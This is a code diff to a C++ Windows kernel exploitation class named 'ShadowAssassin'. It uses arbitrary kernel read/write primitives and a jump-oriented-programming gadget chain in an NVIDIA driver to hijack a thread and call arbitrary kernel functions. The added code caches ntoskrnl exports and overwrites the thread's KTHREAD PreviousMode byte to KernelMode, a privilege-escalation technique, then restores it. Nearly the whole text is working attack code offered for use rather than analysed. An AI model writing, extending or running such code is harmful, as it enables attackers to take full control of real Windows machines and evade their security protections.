@@ -4,7 +4,7 @@
 
 
 ShadowAssassin::ShadowAssassin()
-    : scratchAddress(0)
+    : scratchAddress(0), EPROCESS(0), nvidia_base(0), ntso_base(0), mmGetSystemRoutineAddr(0)
 {}
 
 void ShadowAssassin::SetReadPrimitive(std::function<void(UINT64*, UINT64, UINT64)> fn)  { readFn  = fn; }
@@ -53,9 +53,10 @@ JOPManager&   ShadowAssassin::GetJOPManager()   { return jopManager;   }
 
 
 bool ShadowAssassin::Initialize() {
+    DWORD t0 = GetTickCount();
+
     if (!readFn || !writeFn) {
-        DbgLog("[ShadowAssassin::Initialize] FAIL: readFn=%d writeFn=%d\n",
-            (bool)readFn, (bool)writeFn);
+        DbgLog("[Initialize] FAIL: readFn=%d writeFn=%d\n", (bool)readFn, (bool)writeFn);
         return false;
     }
 
@@ -103,6 +104,9 @@ bool ShadowAssassin::Initialize() {
     }
 
     UINT64 dataSectionRva = GetSectionRva(img, ".data");
+
+    // Build export cache from disk image — O(n) once, all subsequent lookups are O(1)
+    BuildExportCache(img);
     img.Close();
 
     if (!dataSectionRva) {
@@ -138,7 +142,7 @@ bool ShadowAssassin::Initialize() {
 
 	jopManager.SetNvidiaBase(nvidia_base);
 
-    DbgLog("[ShadowAssassin::Initialize] OK: primitives wired\n");
+    DbgLog("[Initialize] Done in %lums\n", GetTickCount() - t0);
     return true;
 }
 
@@ -163,79 +167,40 @@ UINT64 ShadowAssassin::GetSectionRva(const ImageMapping& img, const char* sectio
 }
 
 
+void ShadowAssassin::BuildExportCache(const ImageMapping& img) {
+    DWORD t0 = GetTickCount();
+    if (!img.view) return;
+
+    auto dos = (PIMAGE_DOS_HEADER)img.view;
+    auto nt  = (PIMAGE_NT_HEADERS)((uintptr_t)img.view + dos->e_lfanew);
+
+    DWORD exportDirRva  = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
+    if (!exportDirRva) return;
+
+    auto dir       = (PIMAGE_EXPORT_DIRECTORY)((uintptr_t)img.view + exportDirRva);
+    auto names     = (DWORD* )((uintptr_t)img.view + dir->AddressOfNames);
+    auto funcs     = (DWORD* )((uintptr_t)img.view + dir->AddressOfFunctions);
+    auto ordinals  = (USHORT*)((uintptr_t)img.view + dir->AddressOfNameOrdinals);
+
+    exportCache.reserve(dir->NumberOfNames);
+    for (DWORD i = 0; i < dir->NumberOfNames; i++) {
+        const char* name = (const char*)((uintptr_t)img.view + names[i]);
+        DWORD rva = funcs[ordinals[i]];
+        exportCache[name] = rva;
+    }
+
+    DbgLog("[BuildExportCache] %zu exports cached in %lums\n", exportCache.size(), GetTickCount() - t0);
+}
+
 UINT64 ShadowAssassin::ResolveKernelExport(const std::string& name) {
-    if (!ntso_base) {
-        DbgLog("[ResolveKernelExport] FAIL: ntso_base not set\n");
+    auto it = exportCache.find(name);
+    if (it == exportCache.end()) {
+        DbgLog("[ResolveKernelExport] FAIL: '%s' not in cache\n", name.c_str());
         return 0;
     }
-
-    // Read e_lfanew from DOS header
-    UINT64 e_lfanew = 0;
-    readFn((UINT64*)&e_lfanew, ntso_base + 0x3C, sizeof(ULONG));
-    e_lfanew &= 0xFFFFFFFF;
-
-    // Read export directory RVA from PE optional header DataDirectory[0]
-    UINT64 exportDirRva = 0;
-    readFn((UINT64*)&exportDirRva, ntso_base + e_lfanew + 0x88, sizeof(ULONG));
-    exportDirRva &= 0xFFFFFFFF;
-    if (!exportDirRva) {
-        DbgLog("[ResolveKernelExport] FAIL: no export directory\n");
-        return 0;
-    }
-
-    UINT64 exportDir = ntso_base + exportDirRva;
-
-    UINT64 numberOfNames = 0;
-    readFn((UINT64*)&numberOfNames, exportDir + 0x18, sizeof(ULONG));
-    numberOfNames &= 0xFFFFFFFF;
-
-    UINT64 addressOfNamesRva = 0;
-    readFn((UINT64*)&addressOfNamesRva, exportDir + 0x20, sizeof(ULONG));
-    addressOfNamesRva &= 0xFFFFFFFF;
-
-    UINT64 addressOfFuncsRva = 0;
-    readFn((UINT64*)&addressOfFuncsRva, exportDir + 0x1C, sizeof(ULONG));
-    addressOfFuncsRva &= 0xFFFFFFFF;
-
-    UINT64 addressOfOrdinalsRva = 0;
-    readFn((UINT64*)&addressOfOrdinalsRva, exportDir + 0x24, sizeof(ULONG));
-    addressOfOrdinalsRva &= 0xFFFFFFFF;
-
-    UINT64 namesTable    = ntso_base + addressOfNamesRva;
-    UINT64 funcsTable    = ntso_base + addressOfFuncsRva;
-    UINT64 ordinalTable  = ntso_base + addressOfOrdinalsRva;
-
-    for (UINT64 i = 0; i < numberOfNames; i++) {
-        UINT64 nameRva = 0;
-        readFn((UINT64*)&nameRva, namesTable + i * sizeof(ULONG), sizeof(ULONG));
-        nameRva &= 0xFFFFFFFF;
-
-        // Read up to 64 chars of the export name
-        char exportName[64] = {};
-        for (int c = 0; c < 63; c++) {
-            UINT64 ch = 0;
-            readFn((UINT64*)&ch, ntso_base + nameRva + c, 1);
-            exportName[c] = (char)(ch & 0xFF);
-            if (!exportName[c]) break;
-        }
-
-        if (name == exportName) {
-            UINT64 ordinal = 0;
-            readFn((UINT64*)&ordinal, ordinalTable + i * sizeof(USHORT), sizeof(USHORT));
-            ordinal &= 0xFFFF;
-
-            UINT64 funcRva = 0;
-            readFn((UINT64*)&funcRva, funcsTable + ordinal * sizeof(ULONG), sizeof(ULONG));
-            funcRva &= 0xFFFFFFFF;
-
-            UINT64 result = ntso_base + funcRva;
-            DbgLog("[ResolveKernelExport] %s -> 0x%llX\n", name.c_str(), result);
-            return result;
-        }
-    }
-
-    DbgLog("[ResolveKernelExport] FAIL: '%s' not found\n", name.c_str());
-    return 0;
+    UINT64 result = ntso_base + it->second;
+    DbgLog("[ResolveKernelExport] %s -> 0x%llX\n", name.c_str(), result);
+    return result;
 }
 
 UINT64 ShadowAssassin::GetCurrentEPROCESS(UINT64 eprocess)
@@ -277,23 +242,43 @@ UINT64 ShadowAssassin::GetModuleBaseAddress(const char* targetName) {
     return 0;
 }
 
-
 UINT64 ShadowAssassin::CallSyscall(const std::string& name, const std::vector<UINT64>& params) {
+	UINT64 funcAddr = ResolveKernelExport(name);
+	if (!funcAddr) {
+		DbgLog("[CallSyscall] FAIL: could not resolve '%s'\n", name.c_str());
+		return 0;
+	}
+	return CallSyscallByAddress(funcAddr, params);
+}
 
-    UINT64 funcAddr = ResolveKernelExport(name);
+
+
+UINT64 ShadowAssassin::CallSyscallByAddress(UINT64 funcAddr, const std::vector<UINT64>& params) {
     if (!funcAddr) {
-        DbgLog("[CallSyscall] FAIL: '%s' not found\n", name.c_str());
+        DbgLog("[CallSyscallByAddress] FAIL: null address\n");
         return 0;
     }
-    DbgLog("[CallSyscall] %s -> 0x%llX\n", name.c_str(), funcAddr);
 
+    DWORD t0 = GetTickCount();
 
     frameManager.CreateFrozenThread();
 
     UINT64 frameBase = frameManager.GetFrameAddress();
     if (!frameBase) {
-        DbgLog("[CallSyscall] FAIL: no frame\n");
+        DbgLog("[CallSyscallByAddress] FAIL: no frame\n");
         return 0;
+    }
+    DbgLog("[CallSyscallByAddress] 0x%llX frame=%lums\n", funcAddr, GetTickCount() - t0);
+
+    // Set PreviousMode = KernelMode (0) — read surrounding 8 bytes, patch the byte, write back
+    UINT64 kthread   = frameManager.GetKthreadAddress();
+    UINT64 pmAligned = kthread ? (kthread + (OFF_KTHREAD_PREVIOUS_MODE & ~7ULL)) : 0;
+    UINT64 pmByte    = OFF_KTHREAD_PREVIOUS_MODE & 7;
+    if (kthread) {
+        UINT64 pmQword = 0;
+        readFn(&pmQword, pmAligned, sizeof(UINT64));
+        writeFn(pmAligned, pmQword & ~(0xFFULL << (pmByte * 8))); // clear byte = KernelMode(0)
+        DbgLog("[CallSyscallByAddress] PreviousMode=KernelMode on KTHREAD=0x%llX\n", kthread);
     }
 
     jopManager.Build(0x0078CB9E, 0x006d066a, 0x00671319, 0x0061cbb5);
@@ -318,20 +303,22 @@ UINT64 ShadowAssassin::CallSyscall(const std::string& name, const std::vector<UI
     writeFn(newRsp + 0x30, jopManager.GetRdiForJmp());
 
     frameManager.WriteRegister("rsp", newRsp + 0x30);
-    DbgLog("[CallSyscall] firing  rsp=0x%llX params=%llu\n", newRsp + 0x30, params.size());
 
-
-	DbgLog("[CallSyscall] setting rip to 0x%llX\n", jopManager.GetRip());
-    //Sleep(100);
-	//__debugbreak();
-
+    DWORD tFire = GetTickCount();
     frameManager.ContinueThread();
 
-    Sleep(10);
+    Sleep(50); // wait for chain to complete
     UINT64 retVal = 0;
-
     readFn(&retVal, jopManager.GetReturnValueAddr(), sizeof(UINT64));
 
-    DbgLog("[CallSyscall] %s returned 0x%llX\n", name.c_str(), retVal);
+    // Restore PreviousMode = UserMode (1)
+    if (kthread) {
+        UINT64 pmQword = 0;
+        readFn(&pmQword, pmAligned, sizeof(UINT64));
+        UINT64 pmQwordUser = (pmQword & ~(0xFFULL << (pmByte * 8))) | (1ULL << (pmByte * 8));
+        writeFn(pmAligned, pmQwordUser);
+    }
+    DbgLog("[CallSyscallByAddress] -> 0x%llX (chain %lums, total %lums)\n",
+        retVal, GetTickCount() - tFire, GetTickCount() - t0);
     return retVal;
 }
